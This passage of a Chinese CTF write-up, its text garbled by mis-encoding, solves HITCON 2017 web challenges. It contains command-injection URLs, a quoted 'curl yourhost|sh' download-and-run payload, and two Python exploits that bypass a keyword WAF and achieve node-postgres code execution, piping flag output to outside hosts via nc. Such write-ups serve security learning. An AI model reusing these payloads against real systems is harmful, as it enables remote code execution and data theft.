uid=1000(moxiaoxi) gid=1000(moxiaoxi) groups=1000(moxiaoxi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
```

é‚£ä¹ˆï¼Œæœ€ç»ˆçš„payloadå°±å¾ˆç®€å•äº†ã€‚

```Bash
1. æ–°å»ºä¸€ä¸ªbash%20-c%20/readflag|æ–‡ä»¶
http://13.115.136.15/?url=xxx&filename=|/readflag
2. openæ–‡ä»¶ï¼Œå¹¶è§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œæ‰§è¡Œreadflagï¼Œå¹¶å°†æ•°æ®å†™å…¥flag
http://13.115.136.15/?url=file:|/readflag&filename=flag
3. è®¿é—®sandboxä¸‹çš„flagï¼Œè·å¾—flag
http://13.115.136.15/sandbox/5d4ef0aebfb2070eb64c89b752d7ce89/flag
```

å½“ç„¶ï¼Œæ—¢ç„¶å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œä½ ä¹Ÿå¯ä»¥ä¸‹è½½ä¸€ä¸ªè„šæœ¬ï¼Œç„¶åshæ‰§è¡Œï¼Œå¦‚@Paul Axeå†™çš„WPï¼š

> ```bash
> curl 'http://13.115.136.15/?url=a&filename=|curl+yourhost|sh';curl 'http://13.115.136.15/?url=file:|curl+yourhost|sh' #HITCON SSRFme writeup
> ```

å‚è€ƒï¼š

1. https://github.com/orangetw/My-CTF-Web-Challenges/tree/master
2. https://twitter.com/Paul_Axe/status/927669724439293953
3. https://ricterz.me/posts/HITCON%202017%20SSRFme
4. https://github.com/sorgloomer/writeups/blob/master/writeups/2017-hitcon-quals/ssrfme.md

## SQL so Hard

```php
#!/usr/bin/node

/**
 *  @HITCON CTF 2017
 *  @Author Orange Tsai
 */

const qs = require("qs");
const fs = require("fs");
const pg = require("pg");
const mysql = require("mysql");
const crypto = require("crypto");
const express = require("express");

const pool = mysql.createPool({
    connectionLimit: 100, 
    host: "localhost",
    user: "ban",
    password: "ban",
    database: "bandb",
});

const client = new pg.Client({
    host: "localhost",
    user: "userdb",
    password: "userdb",
    database: "userdb",
});
client.connect();

const KEYWORDS = [
    "select", 
    "union", 
    "and", 
    "or", 
    "\\", 
    "/", 
    "*", 
    " " 
]

function waf(string) {
    for (var i in KEYWORDS) {
        var key = KEYWORDS[i];
        if (string.toLowerCase().indexOf(key) !== -1) {
            return true;
        }
    }
    return false;
}

const app = express();
app.use((req, res, next) => {
   var data = "";
   req.on("data", (chunk) => { data += chunk})
   req.on("end", () =>{
       req.body = qs.parse(data);
       next();
   })
})


app.all("/*", (req, res, next) => {
    if ("show_source" in req.query) {
        return res.end(fs.readFileSync(__filename));
    }
    if (req.path == "/") {
        return next();
    }

    var ip = req.connection.remoteAddress;
    var payload = "";
    for (var k in req.query) {
        if (waf(req.query[k])) {
            payload = req.query[k];
            break;
        }
    }
    for (var k in req.body) {
        if (waf(req.body[k])) {
            payload = req.body[k];
            break;
        }
    }

    if (payload.length > 0) {
        var sql = `INSERT INTO blacklists(ip, payload) VALUES(?, ?) ON DUPLICATE KEY UPDATE payload=?`;
    } else {
        var sql = `SELECT ?,?,?`;
    }
    
    return pool.query(sql, [ip, payload, payload], (err, rows) => {
        var sql = `SELECT * FROM blacklists WHERE ip=?`;
        return pool.query(sql, [ip], (err,rows) => {
            if ( rows.length == 0) {
                return next();
            } else {
                return res.end("Shame on you");
            }
            
        });
    });

});


app.get("/", (req, res) => {
    var sql = `SELECT * FROM blacklists GROUP BY ip`;
    return pool.query(sql, [], (err,rows) => {
        res.header("Content-Type", "text/html");
        var html = "<pre>Here is the <a href=/?show_source=1>source</a>, thanks to Orange\n\n<h3>Hall of Shame</h3>(delete every 60s)\n";
        for(var r in rows) {
            html += `${parseInt(r)+1}. ${rows[r].ip}\n`;

        }
        return res.end(html);
    });

});

app.post("/reg", (req, res) => {
    var username = req.body.username;
    var password = req.body.password;
    if (!username || !password || username.length < 4 || password.length < 4) {
        return res.end("Bye");
    } 

    password = crypto.createHash("md5").update(password).digest("hex");
    var sql = `INSERT INTO users(username, password) VALUES('${username}', '${password}') ON CONFLICT (username) DO NOTHING`;
    return client.query(sql.split(";")[0], (err, rows) => {
        if (rows && rows.rowCount == 1) {
            return res.end("Reg OK");
        } else {
            return res.end("User taken");
        }
    });
});

app.listen(31337, () => {
    console.log("Listen OK");
});


```

è¿™ä¸ªé¢˜å®éªŒå®¤çš„@wdeilå†™äº†ä¸€ä¸ªéå¸¸è¯¦ç»†çš„åˆ†æï¼Œæˆ‘å°±ä¸å†å¤šå†™äº†ã€‚åé¢å¦‚æœèƒ½å¤Ÿå¾å¾—ä»–çš„åŒæ„ï¼Œå†xxxx.

#### æ³•ä¸€ï¼š

å¤§é¢˜æ€è·¯æ˜¯è¿™æ ·ï¼š

è¿™ä¸ªé¢˜ç›®å®ç°äº†ä¸€ä¸ªWAFï¼Œå®ƒçš„å®ç°è¿‡ç¨‹ä¸­ä¼šæœ‰ä¸€ä¸ªMysqlæ’å…¥å’Œå–å‡ºçš„æ“ä½œã€‚

> å®ƒå…ˆå¯¹æˆ‘ä»¬è¯·æ±‚åŒ…ä¸­çš„ querystring å’Œ body å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼Œå¦‚æœå‘ç°å…³é”®å­—ï¼Œåˆ™å°†è¯¥é”®ä¼ â¼Šå…¥çš„å€¼èµ‹ç»™ payload ï¼Œç„¶åæ£€æŸ¥ payload çš„â»“é•¿åº¦ï¼Œå¦‚æœå¤§äº0ï¼Œåˆ™å°† payload å’Œå¯¹åº”çš„ ip æ’â¼Šå…¥MySQL æ•°æ®åº“ï¼Œç„¶åå†â½¤å›è°ƒå‡½æ•°æ£€æŸ¥ MySQL æ•°æ®åº“ä¸­ä½ çš„ ip æ˜¯å¦å­˜åœ¨è¢«æ‹¦æˆªçš„ payload ï¼Œå¦‚æœæœ‰ï¼Œè¿™å°†è¿™ä¸ªè¯·æ±‚ç»“æŸï¼Œå¦åˆ™ç»§ç»­è¿›è¡Œä¸‹â¼€ä¸€æ­¥ã€‚

è€ŒMySQL å¯¹äºæ¯æ¬¡è¿æ¥æœ‰æœ€â¼¤åŒ…é•¿åº¦çš„é™åˆ¶ï¼Œé€šè¿‡ max_allowed_packet çš„é…ç½®æ¥å®ç°ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥insertä¸€ä¸ªé•¿åº¦ç‰¹åˆ«å¤§çš„æ•°æ®ï¼Œè¿™æ ·insertè¯­å¥å°±ä¼šè¢«æˆªæ–­ã€‚æœ€ç»ˆï¼Œæ•°æ®åº“ä¸­å°±ä¸ä¼šæœ‰æ¶æ„payloadä¿¡æ¯ï¼Œå°±ç»•è¿‡äº†wafã€‚

åé¢å°±æ˜¯ä¸€ä¸ªå‰æ®µæ—¶é—´Nodejsç¬¬ä¸‰æ–¹åº“pgå‡ºå¾—RCEï¼Œå¯ä»¥@Phithonåšå®¢ä¸Šçš„[node.js + postgres ä»æ³¨å…¥åˆ°Getshell](https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html)æ–‡ç« ã€‚

æœ€ç»ˆpayloadï¼š

```python
from random import randint
import requests

# payload = "union"
payload = """','')/*%s*/returning(1)as"\\'/*",(1)as"\\'*/-(a=`child_process`)/*",(2)as"\\'*/-(b=`/readflag|nc orange.tw 12345`)/*",(3)as"\\'*/-console.log(process.mainModule.require(a).exec(b))]=1//"--""" % (' '*1024*1024*16)


username = str(randint(1, 65535))+str(randint(1, 65535))+str(randint(1, 65535))
data = {
            'username': username+payload, 
                'password': 'AAAAAA'
                }
print 'ok'
r = requests.post('http://13.113.21.59:31337/reg', data=data);
print r.content
```

#### æ³•äºŒï¼š

ä¸»è¦æ€è·¯æ˜¯é€šè¿‡ Postgre çš„æŸ¥è¯¢è¯­æ³•çš„ç‰¹æ€§ç»•è¿‡ WAF çš„è¿‡æ»¤ã€‚

[https://www.postgresql.org/docs/9.6/static/sql-syntax-lexical.html](https://www.postgresql.org/docs/9.6/static/sql-syntax-lexical.html)

>  A variant of quoted identiï¬ers allows including escaped Unicode characters identiï¬ed by their code points. This variant starts with U& (upper or lower case U followed by ampersand) immediately before the opening double quote, without any spaces in between, for example U&"foo". (Note that this creates an ambiguity with the operator &. Use spaces around the operator to avoid this problem.) Inside the quotes, Unicode characters can be speciï¬ed in escaped form by writing a backslash followed by the four- digit hexadecimal code point number or alternatively a backslash followed by a plus sign followed by a six-digit hexadecimal code point number.
>
>  If a diï¬€erent escape character than backslash is desired, it can be speciï¬ed using the UESCAPE clause after the string

1. Postgres â½€æŒå°†16è¿›åˆ¶çš„å€¼è½¬ä¸º Unicode å­—ç¬¦ï¼›
2. åœ¨å°† 16 è¿›åˆ¶çš„å€¼è½¬ä¸º Unicode å­—ç¬¦çš„æ—¶å€™â½€æ”¯æŒè‡ªå®šä¹‰è½¬ä¹‰ç¬¦ï¼Œå³å¯ä»¥å°†é»˜è®¤çš„ \ æ¢æˆå…¶ä»–å­—ç¬¦ã€‚

```sql
select 'test' as U&"\0031\0032";//test
select 'test' as U&"!0031!0032" uescape '!';//test
```

è¿™æ ·å°±å¯ä»¥å°†å…³é”®å­—ä½¿ç”¨16è¿›åˆ¶è½¬Unicodeçš„æ–¹å¼æ¥ç»•è¿‡ï¼Œç„¶åä½¿ç”¨`\t`æ¥ä»£æ›¿ç©ºæ ¼ã€‚

```python
from random import randint
import requests

payload = """','')returning(1)as\tU&"!005c'!002f!002a"uescape'!',(2)as\tU&"!005c'!002a!002f-(a=`child_process`)!002f!002a"uescape'!',(3)as\tU&"!005c'!002a!002f-(b=`!002freadflag|nc!0020vg.wdeil.xyz!002065502`)!002f!002a"uescape'!',(4)as\tU&"!005c'!002a!002f-console.log(process.mainModule.require(a).exec(b))]=1!002f!002f"uescape'!'; """

username = str(randint(1, 65535))+str(randint(1, 65535))+str(randint(1, 65535))
data = {
            'username': username+payload, 
            'password': 'AAAAAA'
        }
print 'ok'
r = requests.post('http://13.113.21.59:31337/reg', data=data);
print r.content
```



å‚è€ƒï¼š

1. https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/sql-so-hard/exploit.py
2. https://github.com/sorgloomer/writeups/blob/master/writeups/2017-hitcon-quals/sql-so-hard.md
3. wdeilçš„è§£æ







## PHP^H Master PHP in 2017

æºç ï¼š

```php
<?php 
    $FLAG    = create_function("", 'die(`/read_flag`);'); 
    $SECRET  = `/read_secret`; 
    $SANDBOX = "/var/www/data/" . md5("orange" . $_SERVER["REMOTE_ADDR"]);  
    @mkdir($SANDBOX); 
    @chdir($SANDBOX); 

    if (!isset($_COOKIE["session-data"])) { 
        $data = serialize(new User($SANDBOX)); 
        $hmac = hash_hmac("sha1", $data, $SECRET); 
        setcookie("session-data", sprintf("%s-----%s", $data, $hmac)); 
    } 

    class User { 
        public $avatar; 
        function __construct($path) { 
            $this->avatar = $path; 
        } 
    } 

    class Admin extends User { 
        function __destruct(){ 
            $random = bin2hex(openssl_random_pseudo_bytes(32)); 
            eval("function my_function_$random() {" 
                ."  global \$FLAG; \$FLAG();" 
                ."}"); 
            $_GET["lucky"](); 
        } 
    } 

    function check_session() { 
        global $SECRET; 
        $data = $_COOKIE["session-data"]; 
        list($data, $hmac) = explode("-----", $data, 2); 
        if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac)) 
            die("Bye"); 
        if ( !hash_equals(hash_hmac("sha1", $data, $SECRET), $hmac) ) 
            die("Bye Bye"); 

        $data = unserialize($data); 
        if ( !isset($data->avatar) ) 
            die("Bye Bye Bye"); 
        return $data->avatar; 
    } 

    function upload($path) { 
        $data = file_get_contents($_GET["url"] . "/avatar.gif"); 
        if (substr($data, 0, 6) !== "GIF89a") 
            die("Fuck off"); 
        file_put_contents($path . "/avatar.gif", $data); 
        die("Upload OK"); 
    } 

    function show($path) { 
        if ( !file_exists($path . "/avatar.gif") ) 
            $path = "/var/www/html"; 
        header("Content-Type: image/gif"); 
        die(file_get_contents($path . "/avatar.gif")); 
    } 

    $mode = $_GET["m"]; 
    if ($mode == "upload") 
        upload(check_session()); 
    else if ($mode == "show") 
        show(check_session()); 
    else 
        highlight_file(__FILE__); 
```

ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯å¯ä»¥å“ˆå¸Œæ‰©å±•ï¼Œä¼ªé€ ä¸€ä¸ªåºåˆ—åŒ–æ•°æ®æ¥ååºåˆ—åŒ–å¾—åˆ°adminç±»ã€‚ä½†æ˜¯ï¼Œè¿™é‡Œhmacä¸­ï¼Œ$SECRETåœ¨åé¢ï¼Œæ‰€ä»¥æ— æ³•å“ˆå¸Œæ‰©å±•ã€‚

è§£ç­”ï¼š

>Idea
>
>- PHP do the de-serialization on `PHAR` parsing
>- PHP assigned a predictable function name `\x00lambda_%d` to an anonymous function
>- Break shared VARIABLE state in Apache Pre-fork mode

åç»­è¡¥å……ï¼Œæœ€è¿‘å®åœ¨å¤ªå¿™ã€‚:(

å‚è€ƒï¼š

1. https://github.com/php/php-src/blob/238916b5c9b7d09a711aad5656710eb4d1a80518/ext/phar/phar.c#L609


2. https://rdot.org/forum/showthread.php?t=4379











